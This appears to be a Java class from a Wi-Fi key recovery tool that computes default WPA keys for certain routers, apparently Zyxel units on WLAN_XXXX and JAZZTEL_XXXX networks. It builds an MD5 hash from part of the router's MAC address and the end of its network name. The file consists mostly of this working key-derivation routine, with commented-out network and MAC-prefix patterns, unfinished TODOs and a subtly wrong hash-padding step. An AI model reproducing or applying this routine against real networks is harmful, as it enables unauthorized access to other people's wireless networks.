package es.pulimento.wifi.core.algorithms;

import java.math.BigInteger;
import java.security.MessageDigest;
import java.security.NoSuchAlgorithmException;

import es.pulimento.wifi.core.WirelessEncryption;

public class Md5ZAlgorithm extends CrackAlgorithm {

	/*
	 * MD5Z algorithm.
	 * 
	 * TODO: Description and supported routers (ZYXEL).
	 */

	// TODO: Add encryption and clean all up...
	public static WirelessEncryption[] encryption = {  };

	@Override
	protected void setPatterns() {
		// TODO: Add patterns...
		/*matcher_md5Z[0] = Pattern.compile("WLAN_([0-9a-fA-F]{4})").matcher(mESSID); //WLAN_XXXX
		matcher_md5Z[1] = Pattern.compile("(00:1F:A4:[0-9A-Fa-f:]{8})").matcher(mBSSID);
		matcher_md5Z[2] = Pattern.compile("JAZZTEL_([0-9a-fA-F]{4})").matcher(mESSID); //JAZZTEL_XXXX
		matcher_md5Z[3] = Pattern.compile("(00:1F:A4:[0-9A-Fa-f:]{8})").matcher(mBSSID);
		//matcher_md5Z[4] = Pattern.compile("WLAN_([0-9a-fA-F]{4})").matcher(mESSID); //WLAN_XXXX //Son TECOM, no vale
		//matcher_md5Z[5] = Pattern.compile("(00:19:15:[0-9A-Fa-f:]{8})").matcher(mBSSID);
		//matcher_md5Z[6] = Pattern.compile("JAZZTEL_([0-9a-fA-F]{4})").matcher(mESSID); //JAZZTEL_XXXX
		//matcher_md5Z[7] = Pattern.compile("(00:19:15:[0-9A-Fa-f:]{8})").matcher(mBSSID);
		matcher_md5Z[4] = Pattern.compile("WLAN_([0-9a-fA-F]{4})").matcher(mESSID); //WLAN_XXXX
		matcher_md5Z[5] = Pattern.compile("(00:23:F8:[0-9A-Fa-f:]{8})").matcher(mBSSID);
		matcher_md5Z[6] = Pattern.compile("JAZZTEL_([0-9a-fA-F]{4})").matcher(mESSID); //JAZZTEL_XXXX
		matcher_md5Z[7] = Pattern.compile("(00:23:F8:[0-9A-Fa-f:]{8})").matcher(mBSSID);
		matcher_md5Z[8] = Pattern.compile("WLAN_([0-9a-fA-F]{4})").matcher(mESSID); //WLAN_XXXX
		matcher_md5Z[9] = Pattern.compile("(40:4A:03:[0-9A-Fa-f:]{8})").matcher(mBSSID);
		matcher_md5Z[10] = Pattern.compile("JAZZTEL_([0-9a-fA-F]{4})").matcher(mESSID); //JAZZTEL_XXXX
		matcher_md5Z[11] = Pattern.compile("(40:4A:03:[0-9A-Fa-f:]{8})").matcher(mBSSID);
		matcher_md5Z[12] = Pattern.compile("WLAN_([0-9a-fA-F]{4})").matcher(mESSID); //WLAN_XXXX
		matcher_md5Z[13] = Pattern.compile("(98:F5:37:[0-9A-Fa-f:]{8})").matcher(mBSSID);
		matcher_md5Z[14] = Pattern.compile("JAZZTEL_([0-9a-fA-F]{4})").matcher(mESSID); //JAZZTEL_XXXX
		matcher_md5Z[15] = Pattern.compile("(98:F5:37:[0-9A-Fa-f:]{8})").matcher(mBSSID);
		matcher_md5Z[16] = Pattern.compile("WLAN_([0-9a-fA-F]{4})").matcher(mESSID); //WLAN_XXXX
		matcher_md5Z[17] = Pattern.compile("(F4:3E:61:[0-9A-Fa-f:]{8})").matcher(mBSSID);//GongJin Electronics Co.
		matcher_md5Z[18] = Pattern.compile("JAZZTEL_([0-9a-fA-F]{4})").matcher(mESSID); //JAZZTEL_XXXX
		matcher_md5Z[19] = Pattern.compile("(F4:3E:61:[0-9A-Fa-f:]{8})").matcher(mBSSID);//GongJin Electronics Co.*/
		
	}

	@Override
	protected String crackAlgorithm(String essid_data, String bssid_data) {
		bssid_data = bssid_data.replace(":", "").toUpperCase();
		return crack4(essid_data, bssid_data);
	}

	public static String crack4(String iESSID, String iBSSID){
		//String fijo = "bcgbghgg";
    	String ESSID = iESSID.toUpperCase();
    	String BSSID = "";
    	//Tratamos la MAC, para diferenciarla de cuando se intruduce con ':', y la pasamos a mayúsculas
    	String[] aux = iBSSID.split(":");
    	for(String s:aux)BSSID+=s.toUpperCase();
    	//Log.d("pulWifi","Using MD5 algorythm (Zyxel)");
   		//Log.d("pulWifi", "ESSID -> "+ESSID);
   		//Log.d("pulWifi", "MAC -> "+BSSID);
   		String essid_fin = ESSID.substring(ESSID.length()-4,ESSID.length());
   		String principioBSSID = BSSID.substring(0,8);
   		String preMD5 = principioBSSID.toLowerCase()+essid_fin.toLowerCase();
   		//Log.d("pulWifi", "Cadena que se le pasa al MD5 -> "+preMD5);
   		String clave = getMD5(preMD5);
   		//w.setClave(clave);
  		//Log.d("pulWifi", "CLAVE -> "+clave);
   		return clave.toUpperCase();	
   	}
	private static String getMD5(String input) {
        try {
          //Log.d("pulWifi", "Calculando MD5...");
          MessageDigest md = MessageDigest.getInstance("MD5");
          byte[] messageDigest = md.digest(input.getBytes());
          BigInteger number = new BigInteger(1, messageDigest);
          String hashtext = number.toString(16);
          while (hashtext.length() < 20) {
              hashtext = "0" + hashtext;
          }
          return hashtext.substring(0, 20);
        }
        catch (NoSuchAlgorithmException e) {
            throw new RuntimeException(e);
        }
      }
}
